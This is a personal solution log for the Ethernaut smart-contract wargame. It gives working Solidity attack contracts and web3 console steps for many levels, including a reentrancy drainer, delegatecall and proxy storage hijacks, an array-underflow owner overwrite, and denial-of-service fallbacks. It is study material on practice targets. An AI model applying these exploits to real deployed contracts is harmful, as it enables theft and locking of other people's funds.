# Ethernaut Notes

My Notes on [Ethernaut](https://ethernaut.openzeppelin.com) exercises.

# 00. Ethernaut

- Just go through the console.
- Check out all the ABIs.
- Password is inside a function as a variable.

# 01. FallBack

- Getting the various RPC functions like the one to send Transaction.
- Finding the diffrence between receive and fallback functions in solidity.
- Sending ether to contract thus changing the owner to msg.sender.

# 02. Fallout

- Read the code.
- Just Calling Fal1out function will make us the owner.

# 03. Coinflip

- Generating randomness inside a contract using globally available values or Hardcoded values is a Big NO.
- Everything you use in smart contracts is publicly visible, including the local variables and state variables marked as private.
- Using an another contract attacker can hack that randomness.
- Here using Remix IDE we can call that contract inside an malicious contract using the same function we can crack the randomness.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Coinflip.sol";

contract CoinFlipAttack {

  CoinFlip public victim;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor(address _victimAddress) {
    victim = CoinFlip(_victimAddress);
  }

  function flip() public {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    victim.flip(side);
    }
}
```

# 04. Telephone

- `tx.origin` and `msg.sender` Shows same value only if EOA (Externally owned address) is used to call.
- By using another Smart contract to call the function we can take advantage of this contract because Smart contracts are not EOA so `tx.origin` changes.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract TeleAttack {
    Telephone  tele;

    constructor(address _tele) {
        tele = Telephone(_tele);
    }

    function Attack(address _owner) public{
        tele.changeOwner(_owner);
    }
}
```

# 05. Token

- As the hint says taking the case of an classic odometer in our vehicles it has a max and min value. What happens when we go beyond that?
- It is called integer Overflow or Underflow many cyber attacks in our history not only in EVM takes advantage of this issue.
- Because uint is an non negative integer type when we transfer an amount greater than 20 our balance will have this underflow situation.

# 06. Delegation

- As the word meaning say `.delegatecall()` uses memory of the orginal contract and can execute codes on the target contract.
- Usage of delegatecall is particularly risky and has been used as an attack vector on multiple historic hacks.
- Here by creating a variable inside the console and passing it through the `fallback` function to call the `pwn` function in the target contract will make us the owner. `var _pwned = web3.utils.keccak256("pwn()") `

# 07. Force

- In solidity, for a contract to be able to receive ether, the fallback function must be marked payable or a recieve function must be there.
- However, there is no way to stop an attacker from sending ether to a contract by self destroying. Hence, it is important not to count on the invariant address(this).balance == 0 for any contract logic.
- Here using an another contract with some balance we can sent that balance to the target contract by calling `selfdestruct`.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Force.sol";

contract forceit {
    Force force;

    constructor(Force _force) payable {
        force = Force(_force);
    }

    function attack() public payable {
        address payable addr = payable(address(force));
        selfdestruct(addr);
    }

}
```

# 08. Vault

- It's important to remember that marking a variable as private only prevents other contracts from accessing it. State variables marked as private and local variables are still publicly accessible.
- Here we can access the `_password` by finding its memory location( Here 0 for bool and 1 for bytes32 ) and calling that location using `await web3.eth.getStorageAt(instance, 1, console.log)` which gives us the data.
- send that 32 byte data into unlock function to unlock the vault.
- To ensure that data is private, it needs to be encrypted before being put onto the blockchain. In this scenario, the decryption key should never be sent on-chain, as it will then be visible to anyone who looks for it.

# 09. King

- Here we are doing a DOS attack on the contract because even if we sent the biggest possible amount `require(msg.value >= prize || msg.sender == owner)` owner can't be changed and he can always be the King.
- So we send 1 wei more than the current king and use our fallback function to make a DOS. So that when it try to send ETH back we just revert it.

```
fallback() external payable {
    revert("I'm the only KING");
}
```

# 10. Re-entrancy

- Here we can take advantage of the withdraw function because it modify our balances in the last line.
- Using our recieve function to make the withdraw function to be called in a loop before modifying our balances we can empty the funds of this target contract.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Reentrance.sol"; // When using Remix, either get rid of the safemath import or use the url from the OZ repo.

contract ReAttack {
    Reentrance Target;

    constructor(address payable _target) {
        Target = Reentrance(_target);
    }

    function Attack() external payable {
        Target.donate{value: address(Target).balance + 1}(address(this)); // Target.balance = 1000000000000000
        Target.withdraw(1000000000000001); // Hardcoded the value that we sent above
    }

    receive() external payable{
        if (address(Target).balance > 0) {
            Target.withdraw(address(Target).balance);
        }
    }

    function Sent(address payable _me) external payable {   // To sent all the funds back into our wallet
       _me.transfer(address(this).balance);
    }
}
```

# 11. Elevator

- Here we can modify the state of the interface function `isLastFloor` with the help of an external contract.
- Because the function `isLastFloor` is an `external` function with no `view` or `pure` alias.
- You can use the view function modifier on an interface in order to prevent state modifications. The pure modifier also prevents functions from modifying the state.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Elevator.sol";

contract ElevatAttack {

    bool public Top = true;
    Elevator public target;

    constructor (address _target) {
        target = Elevator(_target);
    }

    function isLastFloor(uint) public returns (bool){
        Top = !Top;
        return Top;
    }

    function floor(uint _floor) public {
        target.goTo(_floor);
    }
}
```

# 12. Privacy

- "Privacy" as we saw earlier in Coinflip nothing is private in blockchain not even the private variables.
- EVM stores data as slots each slots are 32 bytes or 256 bits in size so each variables are stored on these slots according to their types.
- In this contract 6 slots are used for the variables : 1 for bool, 1 for uint256, 1 for 2\*uint8 + uint16 and 3 for bytes32[3].
- Here in the require statement data[2] means the 3rd slot for the bytes[3] Because it is stored as 0, 1 and 2.
- We can get the data of each slots from `getStorageAt(...)` function of [web3.js](https://web3js.readthedocs.io/en/v1.8.1/web3-eth.html#getstorageat).
- Here we take the data from the 6th slot (i.e, 5th position), convert that to bytes16 and pass that to unlock function.

# 13. Gatekeeper One

- Here there are 3 modifiers that we need to crack in that first GateOne is same as the Telephone challange we just have to call the function from an contract.
- Second one uses an inbuilt function named `gasleft()` which is used to return the gas left in that contract it checks whether the `gasleft()` is multiple of 8191.
- Third one looks challenging but it just takes specific bits from each inputs and checks the equality. We can see `tx.origin` is the key used here.

```
  contract Hack {

    function enter(address _target, uint gas) external {
        IGateKeeperOne target = IGateKeeperOne(_target);
        // Modifier 3

        // uint64 k;
        // Req3: uint32(k) == uint16(uint160(tx.origin)));
        // Req1: uint32(k) == uint16(k);
        uint16 k16 = uint16(uint160(tx.origin));
        // Req2: uint32(k) != k;
        uint64 k64 = uint64(1 << 63) + uint64(k16);


        bytes8 key = bytes8(k64);
        require(gas < 8191, "gas > 8191"); //Modifier 2
        require( target.enter{gas: 8191 * 10 + gas}(key), "failed");

    }
}
```

# 14. GateKeeper Two

- The first modifier GateOne is a general one that we have cracked before. The second one looks for the size of the caller that is, if caller is EOA its size will be Zero but if its a smart contract its size will not be zero.
- But we can crack GateTwo by calling the function inside the constructor of our attack contract because constructor is called before the coontract creation so the size of the contract at that time will be zero.
- GateThree looks complicated but if we know the principle behind XOR bitwise operation we can crack that. If A XOR B is C, then C XOR B will be equal to A, using this inside our attack contract we can find the key and become the entrant.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GatekeeperTwo.sol";

contract G2Hack {
    constructor(GatekeeperTwo target) {
       uint64 _uintkey = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max;
       bytes8 _key = bytes8(_uintkey);
       require(target.enter(_key),"failed");
    }
}
```

# 15.Naught coin

- Becuase the contract is intialised as an ERC20 there are several [functions from ERC20](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md) that are hidden in this contract(they will be present inside the ABI) and we can take advantage of those.
- `approve()` which is connected to `transferFrom()` function using these two we can get rid of the time lock.

# 16. Preservation

- As we have seen earlier here we can improve our understanding of how storage and delegate calls works.
- Here we need to change the ownership of the contract but there is no function specified for that but we can see the other function which delegate call into a so called library contract.
- The issue with that library contract is it has a state variable `uint storedTime ` which changes when we call that function inside the library.
- The real problem happens when we delegate call into that contract, as we know delegate call use the memory of the contract which calls the library contract. When the variable `storedTime` changes it is actually happening in the memory slot of the Presrvation contract, where slot 1 of it has `address public timeZone1Library;`.
- So we can swap `address public timeZone1Library;` with an attack contract's address by calling `function setFirstTime` with attack contract's address as argument. Inside that contract we can write a fuction named `setTime` which changes owner into msg.sender.
- Remember to initialize the variables inside attack contract same as preservance contract so that the slots are correctly ordered.
- #### Take: As the previous level, delegate mentions, the use of delegatecall to call libraries can be risky. This is particularly true for contract libraries that have their own state. This example demonstrates why the library keyword should be used for building libraries, as it prevents the libraries from storing and accessing state variables.

# 17.Recovery

- Here we need to get the contract address of the `SimpleToken` that was created at the time of the creation of level instance then we can call the `destroy` function of that contract.
- There is 2 ways to get that address the simplest and best way is to check the etherscan the other one is to recreate that address using our instance address and nounce the method for that is explained in this [Stackexchange](https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed) querry.
- After getting that address we can call the `destruct` function using an Attack contract.

```
contract Attack {
    function RecoveryAttack(address payable _simpleToken) public {
        SimpleToken(_simpleToken).destroy(payable(msg.sender));
    }
}
```

# 18. Magic number 42

- Contract creation is a transaction with no recipient but with byte code in its data slot which includes initialisation code (which includes constructor) and runtime code of the contract.
- Smart contract code is compiled to bytecode inside the compiler code written in solidity is converted into opcodes where each opcodes has their own byte representation which as a whole is the bytecode.
- We have to find specific opcodes with the help of [charts](https://ethereum.org/en/developers/docs/evm/opcodes/) or from any other resources and construct a bytecode which perform this specific function of returning number 42.
- We can interact with the contract either from Ethernaut browser console or by using a contract. The contract that can be used to ocrack this level is given below.

```
contract Hack {
    constructor(MagicNum target) {
        bytes memory bytecode = hex"69602a60005260206000f3600052600a6016f3";
        address addr;

        assembly {
            addr:= create(0, add(bytecode, 0x20), 0x13)
        }

        require(addr != address(0));
        target.setSolver(addr);
    }
}
```

- Here `69602a60005260206000f3600052600a6016f3` is the bytecode which has the creation code and runtime code for returning the number 42. This can be understood easily by spliting the bytecode and cross checking it with the chart.

```
Creation code (10 OPCODES)
-------------

69 602a60005260206000f3  | PUSH10 0x602a60005260206000f3
60 00                    | PUSH1 0x0
52                       | MSTORE
60 0a                    | PUSH1 0xa
60 16                    | PUSH1 0x16
f3                       | RETURN

Runtime code (602a60005260206000f3)
------------
60 2a                    | PUSH1 0x2a
60 00                    | PUSH1 0x0
52                       | MSTORE
60 20                    | PUSH1 0x20
60 00                    | PUSH1 0x0
f3                       | RETURN
```

- From browser console set this bytecode into a variable `bytecode` and use `web3.eth.sendTransaction(from: player, data: bytecode)` to crack the level.

# 19. Alien codex

- Here we can exploit the `retract()` function because its not checking for the underflow or overflow of the array. Initially the owner and bool value will be assigned to the slot 0 of the storage, slot 1 will be used for storing the length of the dynamic array codex.
- After calling the 'retract()' on an empty array the array now takes the whole 2^256 slots of storage, Now we can manipulate the owner on the slot 0 by calling `revise()` function.
- This level can also be cracked from both the console or using an external contract, Contract used for cracking this level is given below.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IAlienCodex {
    function owner() view external returns(address);
    function make_contact() external;
    function retract() external;
    function revise(uint i, bytes32 _content) external;

}
contract Hack {
    constructor(IAlienCodex target) {
        target.make_contact();
        target.retract();

        uint256 h = uint256(keccak256(abi.encode(uint256(1))));
        uint256 i;
        unchecked{
            i -= h;
        }

        target.revise(i, bytes32(uint256(uint160(msg.sender))));
        require(target.owner() == msg.sender, "failed");
    }
}

```

- Here h shows how a dynammic array stores values in diffrent memory positions by hashing the slot number of codex and slot 0 (here i) can be found by taking negative of h i.e, slot 0 = slot h - i, h - i = 0, i = h - 0.

# 20. Denial

- Here we can perform a DOS attack on the `Withdraw()` function by setting the partner address to an external contract, because while the `withdraw()` performs a low level call to sent the transaction to partner it doesn't limit the gas value.
- We can insert an `invalid()` function from assembly to the `fallback` function.

```
fallback() external payable {
        assembly{
            invalid()
        }
    }
```

# 21. Shop

- Here we can take advantage of price function because it is dependent on an external contract and there is no checks on that contract.
- With an external contract we can use a conditional statement to set price before and after the state of bool value isSold. That is when is isSold bool is false we need to set price to 100 and if its true we can set a lower value. Because `price()` function is called twice before and after the checks.

# 22. DEX

- Here we can take advantage of the floating point error while calculating the `getSwapPrice`. In solidiy division on uint will give a rounded result for eg: 3/2 gives 1.
- So here when we swap we change the pool like this.

              DEX       |        player
        token1 - token2 | token1 - token2
        ----------------------------------
          100     100   |   10      10
          110     90    |   0       20
          86      110   |   24      0
          110     80    |   0       30
          69      110   |   41      0
          110     45    |   0       65
          0       90    |   110     20

# 23. DEX2

- Unlike challange 21 above here lack of valdation for token 1 and token 2 in swap function will make us take the advantage.
- Creating 2 evil ERC20 token and passing 1 token of each to the DEX2 contract will allow us to take all the token1 and token2.
- Then swapping 1 of each evil token for 100 of both token1 and token2 will make us pass this level.
- A snippet of the Hack contract is shown below.

```
        evilToken1.mint(2);
        evilToken2.mint(2);

        evilToken1.transfer(address(dex), 1);
        evilToken2.transfer(address(dex), 1);

        evilToken1.approve(address(dex), 1);
        evilToken2.approve(address(dex), 1);

        dex.swap(address(evilToken1), address(token1), 1);
        dex.swap(address(evilToken2), address(token2), 1);
```

# 24. Puzzle wallet

- The thing we have to look for while using proxy here is the state storage.
- Here the implimentation contract uses the memory of logic contract and they are not assigned properly so we can take advantage of that.

```
// These are the 2 storage slots which are assigned wrong.
// Changing pendingAdmin in PuzzleProxy makes us the owner of PuzzleWallet.

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
```

- After being the owner of PuzzleWallet we can get into the whitelist and change the maxBalance and become the admin of PuzzleProxy.
- But there is an caveat changing the maxBalance we need to make the balance of the address to 0 for that to we need to deposit some ether to the contract and get all of the balance out.
- To take the balance out we can take advantage of multicall() and Delegate call by coupling 2 deposits with only ether for one deposit.

```
interface IWallet {
    function proposeNewAdmin(address _newAdmin) external;
    function addToWhitelist(address addr) external;
    function deposit() external payable;
    function multicall(bytes[] calldata data) external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function setMaxBalance(uint256 _maxBalance) external;
}

contract Hack {
    constructor(IWallet wallet) payable {
        // overwrite wallet owner
        wallet.proposeNewAdmin(address(this));
        wallet.addToWhitelist(address(this));

        bytes[] memory deposit_data = new bytes[](1);
        deposit_data[0] = abi.encodeWithSelector(wallet.deposit.selector);

        bytes[] memory data = new bytes[](2);
        // deposit
        data[0] = deposit_data[0];
        // multicall -> deposit
        data[1] = abi.encodeWithSelector(wallet.multicall.selector, deposit_data);
        wallet.multicall{value: 0.001 ether}(data);

        // withdraw
        wallet.execute(msg.sender, 0.002 ether, "");

        // set admin
        wallet.setMaxBalance(uint256(uint160(msg.sender)));
    }
```

# 25. Motorbike

- Here the important thing we have to do is going through the upgrader variable then we will see that initialize() was not called by the implementaion contract and upgrader is empty.
- When we call the initialize() we can become the upgrader and change the implementation contract to our malicious contract and calling selfdestruct on that makes the proxy into a permananent block where the funds send to the Motorbike will get stuck in that contract.
- Here we can get the address of implementation contract by passing `_IMPLEMENTATION_SLOT` into `web3.eth.getStorageAt()` as `web3.eth.getStorageAt(contract.address, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")`.

```
interface IEngine {
    function upgrader() external view returns(address);
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}
contract Hack {

    function pwn(IEngine target) external {
        target.initialize();
        target.upgradeToAndCall(address(this), abi.encodeWithSelector(this.kill.selector));
    }

    function kill() external {
        selfdestruct(payable(address(0)));
    }
}
```

# 26. Double entry point

- This contract features a Forta contract where any user can register its own detection bot contract.
- So here we need to add some special code into that detection bot that can find this vulnerability.
